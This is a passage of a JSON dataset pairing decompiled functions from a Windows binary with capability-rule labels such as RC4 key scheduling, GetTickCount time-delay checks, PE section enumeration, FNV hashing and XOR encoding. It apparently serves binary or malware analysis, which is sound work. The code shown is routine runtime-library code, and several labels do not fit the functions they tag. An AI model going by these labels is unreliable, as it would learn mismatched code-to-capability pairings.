(((iVar1 == 0) && (iVar1 = *(arg_8h + 5) - *(arg_ch + 5),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 6) - *(arg_ch + 6),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 7) - *(arg_ch + 7);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[2] != arg_ch[2]) {\n                iVar1 = (arg_8h[2] & 0xff) - *(arg_ch + 2);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 9) - *(arg_ch + 9),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 10) - *(arg_ch + 10),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[3] != arg_ch[3]) {\n                iVar1 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 0xd) - *(arg_ch + 0xd),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 0xe) - *(arg_ch + 0xe),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[4] != arg_ch[4]) {\n                iVar1 = (arg_8h[4] & 0xff) - *(arg_ch + 4);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 0x11) - *(arg_ch + 0x11),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 0x12) - *(arg_ch + 0x12),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[5] != arg_ch[5]) {\n                iVar1 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 0x15) - *(arg_ch + 0x15),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 0x16) - *(arg_ch + 0x16),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[6] != arg_ch[6]) {\n                iVar1 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 0x19) - *(arg_ch + 0x19),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            if (arg_8h[7] != arg_ch[7]) {\n                iVar1 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n                if (((iVar1 == 0) && (iVar1 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d),  iVar1 == 0)) &&\n                   (iVar1 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e),  iVar1 == 0)) {\n                    iVar1 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                    if (iVar1 != 0) {\n                        iVar1 = (0 < iVar1) * 2 + -1;\n                    }\n                }\n                else {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n            }\n            arg_10h = arg_10h - 0x20;\n            arg_8h = arg_8h + 8;\n            arg_ch = arg_ch + 8;\n        } while (0x1f < arg_10h);\n    }\n    // WARNING: Could not recover jumptable at 0x00486a12. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (32 cases) at 0x4874cc\n    iVar1 = (**(arg_10h * 4 + 0x4874cc))();\n    return iVar1;\n}\n",
        "token_count": 1884
    },
    "004d6287": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004d6287(uint16_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    uVar3 = arg_8h[3];\n    uVar2 = uVar3 >> 4 & 0x7ff;\n    if (uVar2 == 0x7ff) {\n        if (((((uVar3 & 0xf) == 0) && (arg_8h[2] == 0)) && (arg_8h[1] == 0)) && (*arg_8h == 0)) {\n            return 1;\n        }\n        return 2;\n    }\n    if (((((uVar3 & 0x7fff) == 0) && (arg_8h[2] == 0)) && ((arg_8h[1] == 0 && (*arg_8h == 0)))) ||\n       (arg_ch._0_2_ = (0x433 - uVar2) - arg_ch,  arg_ch < 1)) {\n        return 0;\n    }\n    if (0x34 < arg_ch) {\n        *(arg_8h + 1) = 0;\n        *arg_8h = 0;\n        arg_8h[3] = uVar3 & 0x8000;\n        return -1;\n    }\n    iVar4 = arg_ch >> 4;\n    iVar1 = *(iVar4 * 4 + 0x55492c);\n    uVar3 = *((arg_ch & 0xfU) * 2 + 0x554904) & arg_8h[iVar1];\n    arg_8h[iVar1] = arg_8h[iVar1] ^ uVar3;\n    if (iVar4 != 1) {\n        if (iVar4 != 2) {\n            if (iVar4 != 3) goto code_r0x004d637f;\n            uVar3 = uVar3 | arg_8h[2];\n            arg_8h[2] = 0;\n        }\n        uVar3 = uVar3 | arg_8h[1];\n        arg_8h[1] = 0;\n    }\n    uVar3 = uVar3 | *arg_8h;\n    *arg_8h = 0;\ncode_r0x004d637f:\n    return (uVar3 == 0) - 1;\n}\n",
        "token_count": 558
    },
    "004013bb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013bb(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.004040d9(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00402ed2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00402ed2(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x56ec4c < 1) {\n        uVar1 = 0;\n        if ((in_FPUStatusWord & 0x3f) != 0) {\n            uVar1 = (in_FPUStatusWord & 1) << 4;\n            if ((in_FPUStatusWord & 4) != 0) {\n                uVar1 = uVar1 | 8;\n            }\n            if ((in_FPUStatusWord & 8) != 0) {\n                uVar1 = uVar1 | 4;\n            }\n            if ((in_FPUStatusWord & 0x10) != 0) {\n                uVar1 = uVar1 | 2;\n            }\n            if ((in_FPUStatusWord & 0x20) != 0) {\n                uVar1 = uVar1 | 1;\n            }\n            if ((in_FPUStatusWord & 2) != 0) {\n                uVar1 = uVar1 | 0x80000;\n            }\n        }\n    }\n    else {\n        uVar1 = 0;\n        uVar2 = 0;\n        if ((in_FPUStatusWord & 0x3f) != 0) {\n            uVar2 = (in_FPUStatusWord & 1) << 4;\n            if ((in_FPUStatusWord & 4) != 0) {\n                uVar2 = uVar2 | 8;\n            }\n            if ((in_FPUStatusWord & 8) != 0) {\n                uVar2 = uVar2 | 4;\n            }\n            if ((in_FPUStatusWord & 0x10) != 0) {\n                uVar2 = uVar2 | 2;\n            }\n            if ((in_FPUStatusWord & 0x20) != 0) {\n                uVar2 = uVar2 | 1;\n            }\n            if ((in_FPUStatusWord & 2) != 0) {\n                uVar2 = uVar2 | 0x80000;\n            }\n        }\n        if ((in_MXCSR & 0x3f) != 0) {\n            uVar1 = (in_MXCSR & 1) << 4;\n            if ((in_MXCSR & 4) != 0) {\n                uVar1 = uVar1 | 8;\n            }\n            if ((in_MXCSR & 8) != 0) {\n                uVar1 = uVar1 | 4;\n            }\n            if ((in_MXCSR & 0x10) != 0) {\n                uVar1 = uVar1 | 2;\n            }\n            if ((in_MXCSR & 0x20) != 0) {\n                uVar1 = uVar1 | 1;\n            }\n            if ((in_MXCSR & 2) != 0) {\n                uVar1 = uVar1 | 0x80000;\n            }\n        }\n        uVar1 = uVar1 | uVar2;\n    }\n    return uVar1;\n}\n",
        "token_count": 736
    },
    "004032ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004032ab(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            pcVar1 = *(arg_ch + -4);\n            if (pcVar1 != NULL) {\n                (**0x573000)(0);\n                (*pcVar1)();\n            }\n            arg_ch = arg_ch + -8;\n        } while (arg_ch != arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 117
    },
    "00403567": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403567(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar3 = arg_8h - arg_10h;\n    iVar6 = (arg_ch - arg_14h) - (arg_8h < arg_10h);\n    uVar1 = 0;\n    iVar2 = 1;\n    if ((0 < arg_ch) || (iVar4 = iVar2,  -1 < arg_ch)) {\n        iVar4 = 0;\n    }\n    if ((0 < arg_14h) || (iVar5 = iVar2,  -1 < arg_14h)) {\n        iVar5 = 0;\n    }\n    if (iVar4 != iVar5) {\n        if ((0 < arg_ch) || (iVar4 = iVar2,  -1 < arg_ch)) {\n            iVar4 = 0;\n        }\n        if ((0 < iVar6) || (-1 < iVar6)) {\n            iVar2 = 0;\n        }\n        if (iVar4 != iVar2) {\n            iVar3 = -1;\n            uVar1 = 0x80070216;\n            iVar6 = -1;\n        }\n    }\n    *arg_18h = iVar3;\n    arg_18h[1] = iVar6;\n    return uVar1;\n}\n",
        "token_count": 353
    },
    "004037ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004037ab(int32_t *param_1)\n\n{\n    int32_t *arg_8h;\n    \n    if ((*param_1 != 0) && (arg_8h = *param_1 + -8,  *arg_8h == 0xdddd)) {\n        fcn.004040d9(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00460ebd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00460ebd(uint noname_0, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = arg_10h - arg_ch;\n    if (arg_14h <= arg_10h - arg_ch) {\n        uVar1 = arg_14h;\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00401627": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401627(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_4h;\n    \n    in_ECX[1] = 0x1;\n    *in_ECX = vtable.std::locale::_Locimp.0;\n    in_ECX[2] = NULL;\n    in_ECX[3] = NULL;\n    in_ECX[4] = NULL;\n    *(in_ECX + 5) = arg_8h;\n    in_ECX[6] = NULL;\n    *(in_ECX + 7) = 0;\n    fcn.00404b6a(0x54d840);\n    return;\n}\n",
        "token_count": 150
    },
    "004021f8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004021f8(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = param_1 + 4;\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x1c) = param_1 + 0x14;\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x2c) = param_1 + 0x24;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x24) = 0;\n    return;\n}\n",
        "token_count": 232
    },
    "0046158b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046158b(uint *arg_8h)\n\n{\n    *arg_8h = 0xffffffff;\n    arg_8h[1] = 0xffffffff;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "00404679": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00404679(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    *(param_1 + 0x32) = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    *(param_1 + 0xc) = 0;\n    param_1[0xe] = 0;\n    *(param_1 + 0xf) = 0;\n    param_1[0x110] = 0;\n    param_1[0x111] = 0;\n    return param_1;\n}\n",
        "token_count": 233
    },
    "004614b1": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004614b1(uint *arg_8h)\n\n{\n    *arg_8h = 0xffffffff;\n    arg_8h[1] = 0xffffffff;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "00405bcd": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00405bcd(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    *(param_1 + 0xc) = 0;\n    param_1[0xe] = 0;\n    *(param_1 + 0xf) = 0;\n    param_1[0x110] = 0;\n    param_1[0x111] = 0;\n    return param_1;\n}\n",
        "token_count": 218
    },
    "00404264": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404264(int32_t *arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    piVar2 = fcn.004052ae(arg_8h);\n    if (piVar2 == '\\0') {\ncode_r0x004c3c8d:\n        return piVar2 & 0xffffff00;\n    }\n    piVar2 = fcn.00403945(1);\n    if (arg_8h == piVar2) {\n        piVar4 = 0x570210;\n    }\n    else {\n        piVar2 = fcn.00403945(2);\n        if (arg_8h != piVar2) goto code_r0x004c3c8d;\n        piVar4 = 0x570214;\n    }\n    *0x570064 = *0x570064 + 1;\n    ppiVar1 = arg_8h + 3;\n    piVar2 = *ppiVar1;\n    if ((piVar2 & 0x4c0) != 0) goto code_r0x004c3c8d;\n    LOCK();\n    *ppiVar1 = *ppiVar1 | 0x282;\n    iVar3 = *piVar4;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00403ff3(0x1000);\n        *piVar4 = iVar3;\n        fcn.00406302(0);\n        iVar3 = *piVar4;\n        if (iVar3 == 0) {\n            arg_8h[2] = 2;\n            arg_8h[1] = arg_8h + 5;\n            *arg_8h = arg_8h + 5;\n            arg_8h[6] = 2;\n            goto code_r0x004c3c72;\n        }\n    }\n    arg_8h[1] = iVar3;\n    iVar3 = *piVar4;\n    *arg_8h = iVar3;\n    arg_8h[2] = 0x1000;\n    arg_8h[6] = 0x1000;\ncode_r0x004c3c72:\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 523
    },
    "00404fcf": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00404fcf(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.004030e9(0);\n    *(extraout_ECX + 0x14) = 0x201;\n    uVar2 = 0;\n    *(extraout_ECX + 0x30) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x18) = 6;\n    *(extraout_ECX + 0x1c) = 0;\n    *(extraout_ECX + 0x20) = 0;\n    *(extraout_ECX + 0x24) = 0;\n    *(extraout_ECX + 0x28) = 0;\n    *(extraout_ECX + 0x2c) = 0;\n    fcn.004032fb(0, 0);\n    iVar1 = fcn.004024b9(8, uVar2);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00404ed5(1);\n        *(iVar1 + 4) = uVar2;\n    }\n    *(extraout_ECX + 0x30) = iVar1;\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 374
    },
    "004028b0": {
        "rules": [
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004028b0(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_10h != 0) {\n        do {\n            arg_8h = (*(uVar1 + arg_ch) ^ arg_8h) * 0x1000193;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 131
    },
    "0040539e": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040539e(uint dwMilliseconds)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = *0x56ec08;\n    if (*0x56ec08 == NULL) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56ebf0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(*0x56ebec, dwMilliseconds, 0);\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x56ebf0);\n    }\n    else {\n        (**0x573000)(0x56ebe8, 0x56ebf0, dwMilliseconds);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "004df91d": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004df91d(void)\n\n{\n    *0x56d930 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401497": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401497(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t arg_ch;\n    \n    arg_ch = 0;\n    iVar1 = *arg_8h;\n    piVar2 = arg_8h;\n    while (iVar1 != 0) {\n        piVar2 = piVar2 + 1;\n        arg_ch = arg_ch + 1;\n        iVar1 = *piVar2;\n    }\n    fcn.004045cf(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 133
    },
    "004014c9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014c9(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00401d9d(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 132
    },
    "0040159b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040159b(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 < 0xffffffe1) {\n        if (param_1 == 0) {\n            param_1 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5705b8, 0, param_1);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040483b();\n        } while ((iVar1 != 0) && (iVar1 = fcn.004040de(param_1),  iVar1 != 0));\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 194
    },
    "00401db1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401db1(void)\n\n{\n    uchar *in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    uint unaff_retaddr;\n    uchar auStack4 [4];\n    \n    puVar2 = &stack0x00000000 - in_EAX & ~-(*0x10 < in_EAX);\n    for (puVar1 = auStack4 & 0xfffff000; puVar2 < puVar1; puVar1 = puVar1 + -0x400) {\n    }\n    *puVar2 = unaff_retaddr;\n    return;\n}\n",
        "token_count": 133
    },
    "00402527": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402527(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint16_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.0040637f(*arg_18h);\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 148
    },
    "00402702": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00402702(uint8_t *param_1, uint32_t param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    \n    if (param_1 == NULL) {\n        param_2 = 0;\n    }\n    else {\n        if (param_2 != 0) {\n            if ((param_2 & 0xffffff80) == 0) {\n                *param_1 = param_2;\n                return 1;\n            }\n            if ((param_2 & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar2 = iVar4;\n            }\n            else if ((param_2 & 0xffff0000) == 0) {\n                if ((0xd7ff < param_2) && (param_2 < 0xe000)) {\ncode_r0x004d6e05:\n                    iVar2 = fcn.004025c7(param_3);\n                    return iVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar2 = iVar4;\n            }\n            else {\n                if (((param_2 & 0xffe00000) != 0) || (0x10ffff < param_2)) goto code_r0x004d6e05;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar2 = iVar4;\n            }\n            do {\n                uVar1 = param_2;\n                param_2 = param_2 >> 6;\n                param_1[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *param_1 = param_2 | uVar3;\n            *param_3 = 0;\n            param_3[1] = 0;\n            return iVar2 + 1;\n        }\n        *param_1 = param_2;\n    }\n    *param_3 = param_2;\n    param_3[1] = param_2;\n    return 1;\n}\n",
        "token_count": 498
    },
    "00402d01": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00402d01(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x5701b8 != 0) {\n        iVar2 = *0x5701b8 * 0x18 + 0x570050;\n        iVar1 = *0x5701b8;\n        do {\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar2);\n            *0x5701b8 = *0x5701b8 + -1;\n            iVar2 = iVar2 + -0x18;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 1;\n}\n",
        "token_count": 154
    },
    "00402e91": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e91(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    fcn.004060f5(2);\n    uVar2 = 1;\n    *(arg_8h + 8) = 1;\n    do {\n        iVar1 = *(uVar2 * 4 + 0x56f250);\n        if ((iVar1 == 0) || (iVar1 == arg_8h)) break;\n        uVar2 = uVar2 + 1;\n        *(arg_8h + 8) = uVar2;\n    } while (uVar2 < 8);\n    *(uVar2 + 0x56f278) = *(uVar2 + 0x56f278) + '\\x01';\n    *(uVar2 * 4 + 0x56f250) = arg_8h;\n    fcn.00403684();\n    return;\n}\n",
        "token_count": 222
    },
    "00403008": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403008(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00402ad6();\n    piVar1 = *(iVar2 + 0x24);\n    while( true ) {\n        if (piVar1 == NULL) {\n            return 1;\n        }\n        if (*piVar1 == arg_8h) break;\n        piVar1 = piVar1[1];\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "004032a6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004032a6(char *arg_8h, char **arg_ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    cVar3 = *arg_8h;\n    do {\n        if ((cVar3 != \"IND)ind)S\"[iVar1]) && (cVar3 != \"IND)ind)S\"[iVar1 + 4])) goto code_r0x004b447a;\n        cVar3 = **arg_ch;\n        in_EAX = *arg_ch + 1;\n        iVar1 = iVar1 + 1;\n        *arg_ch = in_EAX;\n        *arg_8h = cVar3;\n    } while (iVar1 != 4);\n    uVar2 = 1;\ncode_r0x004b447a:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 224
    },
    "00403387": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00403387(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h;\n    \n    if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {\n        arg_8h = param_1 * param_2;\n        if (arg_8h == 0) {\n            arg_8h = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5705b8, 8, arg_8h);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040483b();\n        } while ((iVar1 != 0) && (iVar1 = fcn.004040de(arg_8h),  iVar1 != 0));\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 240
    },
    "00403698": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00403698(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 == 0) {\n        iVar1 = fcn.00403ff3(param_2);\n    }\n    else {\n        if (param_2 == 0) {\n            fcn.00406302(param_1);\n        }\n        else {\n            if (param_2 < 0xffffffe1) {\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x5705b8, 0, param_1, param_2);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                    iVar1 = fcn.0040483b();\n                } while ((iVar1 != 0) && (iVar1 = fcn.004040de(param_2),  iVar1 != 0));\n            }\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0xc;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 253
    },
    "004038dc": {
        "rules": [
            "contain loop"
        ],
